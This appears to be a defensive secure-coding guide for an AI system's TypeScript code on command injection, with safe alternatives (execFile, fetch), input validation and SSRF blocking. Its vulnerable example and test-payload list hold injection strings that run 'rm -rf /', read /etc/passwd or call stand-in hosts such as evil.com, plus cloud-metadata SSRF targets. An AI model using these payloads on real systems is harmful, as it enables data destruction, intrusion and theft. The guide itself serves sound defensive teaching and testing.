# Command Injection & Shell Safety

**Defense protocol for all PAI code**

---

## Threat

Shell command injection via unsanitized external input (URLs, filenames, API parameters) passed to shell commands, allowing arbitrary command execution.

---

## The Core Vulnerability

**Shell Metacharacter Interpretation:**

When external input is interpolated directly into shell command strings, shell metacharacters are interpreted:
- `;` (command separator)
- `|` (pipe)
- `&` (background execution)
- `$()` or `` ` `` (command substitution)
- `>` `<` (redirection)
- `*` `?` (glob expansion)

**Example Attack:**
```typescript
// VULNERABLE CODE
const url = userInput; // "https://example.com; rm -rf / #"
await exec(`curl -L "${url}"`);
// Executes: curl -L "https://example.com; rm -rf / #"
// Which runs TWO commands: curl AND rm -rf /
```

---

## Defense Protocol

### 1. NEVER Use Shell Interpolation for External Input

**ALWAYS VULNERABLE:**
```typescript
// BAD - Shell interpolation with external input
exec(`curl "${url}"`);
exec(`wget ${url}`);
exec(`git clone ${repoUrl}`);
exec(`python script.py ${filename}`);
$`some-command ${externalInput}`; // Even with template literals!
```

**SAFE - Separate Arguments (No Shell):**
```typescript
import { execFile } from 'child_process';
import { promisify } from 'util';

const execFileAsync = promisify(execFile);

// SAFE - Arguments passed separately, NO shell interpretation
await execFileAsync('curl', ['-L', url]);
await execFileAsync('git', ['clone', repoUrl]);
await execFileAsync('python', ['script.py', filename]);
```

**EVEN BETTER - Native Libraries:**
```typescript
// BEST - No shell involved at all
const response = await fetch(url);
const html = await response.text();
```

### 2. Validate ALL External Input

**URL Validation (Mandatory for Web Operations):**
```typescript
function validateUrl(url: string): void {
  // 1. Schema allowlist
  if (!url.startsWith('http://') && !url.startsWith('https://')) {
    throw new Error('Only HTTP/HTTPS URLs allowed');
  }

  // 2. Parse and validate structure
  let parsed: URL;
  try {
    parsed = new URL(url);
  } catch {
    throw new Error('Invalid URL format');
  }

  // 3. SSRF protection - block internal/private IPs
  const blocked = [
    '127.0.0.1', 'localhost', '0.0.0.0',
    '::1', // IPv6 localhost
    '169.254.169.254', // AWS metadata service
    '169.254.', // Link-local addresses
    'metadata.google.internal', // GCP metadata
  ];

  const hostname = parsed.hostname.toLowerCase();

  if (blocked.some(b => hostname === b || hostname.startsWith(b))) {
    throw new Error('Internal/private URLs not allowed');
  }

  // Block private IP ranges
  if (
    hostname.startsWith('10.') ||
    hostname.startsWith('172.16.') ||
    hostname.startsWith('192.168.') ||
    hostname.startsWith('fc00:') || // IPv6 private
    hostname.startsWith('fd00:')
  ) {
    throw new Error('Private network URLs not allowed');
  }
}
```

**Filename Validation:**
```typescript
function validateFilename(filename: string): void {
  // Block path traversal
  if (filename.includes('..') || filename.includes('/') || filename.includes('\\')) {
    throw new Error('Path traversal not allowed');
  }

  // Character allowlisting
  if (!/^[a-zA-Z0-9._-]+$/.test(filename)) {
    throw new Error('Invalid filename characters');
  }
}
```

### 3. When Shell Commands Are Necessary

If you MUST use shell commands (rare cases), follow these rules:

```typescript
import { spawn } from 'child_process';

// Use spawn/execFile with argument array
const process = spawn('command', [
  '--option', 'value',
  validatedInput // Passed as separate argument
], {
  shell: false, // CRITICAL: Disable shell interpretation
  timeout: 30000,
  maxBuffer: 10 * 1024 * 1024 // 10MB limit
});
```

**NEVER:**
- Use `exec()` with external input
- Use `child_process.exec()` with string interpolation
- Use Bun's `$` template with external input
- Construct command strings from external input

### 4. Error Sanitization

Errors from external operations can leak sensitive information:

```typescript
try {
  await fetchUrl(url);
} catch (error) {
  // DON'T: Expose raw error to user
  // throw error;

  // DO: Sanitize error message
  if (error instanceof Error) {
    const sanitized = error.message
      .replace(/\/Users\/[^\/]+\/[^\s]+/g, '[REDACTED_PATH]')
      .replace(/127\.0\.0\.1|localhost/g, '[INTERNAL]')
      .split('\n')[0]; // Only first line, no stack trace

    throw new Error(`Operation failed: ${sanitized}`);
  }
  throw new Error('Operation failed');
}
```

### 5. Input Validation Layers

Apply defense in depth:

```typescript
async function safeFetch(url: string): Promise<string> {
  // Layer 1: Type validation
  if (typeof url !== 'string') {
    throw new Error('URL must be a string');
  }

  // Layer 2: Format validation
  validateUrl(url); // Throws on invalid

  // Layer 3: Length validation
  if (url.length > 2048) {
    throw new Error('URL too long');
  }

  // Layer 4: Use safe API
  const response = await fetch(url, {
    redirect: 'follow',
    signal: AbortSignal.timeout(10000)
  });

  // Layer 5: Response validation
  if (!response.ok) {
    throw new Error(`HTTP ${response.status}`);
  }

  // Layer 6: Size validation
  const contentLength = response.headers.get('content-length');
  if (contentLength && parseInt(contentLength) > 10_000_000) {
    throw new Error('Response too large');
  }

  return await response.text();
}
```

---

## Testing for Command Injection

**Test every external input with malicious payloads:**

```typescript
const testPayloads = [
  'https://example.com"; whoami #',
  'https://example.com"; rm -rf / #',
  'https://example.com | cat /etc/passwd',
  'https://example.com & curl attacker.com',
  'https://example.com$(curl evil.com)',
  'https://example.com`curl evil.com`',
  'file:///etc/passwd',
  'http://localhost:8080/admin',
  'http://127.0.0.1:22',
  'http://169.254.169.254/latest/meta-data/',
];

// ALL of these should be REJECTED or SANITIZED
for (const payload of testPayloads) {
  try {
    await safeFetch(payload);
    console.error(`FAILED: Accepted malicious input: ${payload}`);
  } catch (error) {
    console.log(`PASSED: Rejected malicious input`);
  }
}
```

---

## Safe Alternatives Checklist

Before using shell commands, check if a safe alternative exists:

| Task | Shell Command | Safe Alternative |
|------|---------------|------------------|
| HTTP request | `curl`, `wget` | `fetch()`, native HTTP |
| File operations | `cat`, `grep`, `sed` | `fs.readFile()`, String methods |
| JSON processing | `jq` via shell | `JSON.parse()` |
| Compression | `tar`, `gzip` via shell | Native libraries |
| Git operations | `git` via shell | `isomorphic-git` |
| Database queries | `mysql` via shell | Database drivers |

---

## Enforcement

Before using shell commands with ANY external input:
1. Can I use a native library instead? (Usually YES)
2. If shell is required, am I using `execFile()` with argument array?
3. Have I validated the input against an allowlist?
4. Have I implemented SSRF protection?
5. Have I tested with malicious payloads?

If you answer NO to any question, DO NOT PROCEED. Use a safe alternative.

---

## When in Doubt

**Ask the user before executing shell commands with external input.**
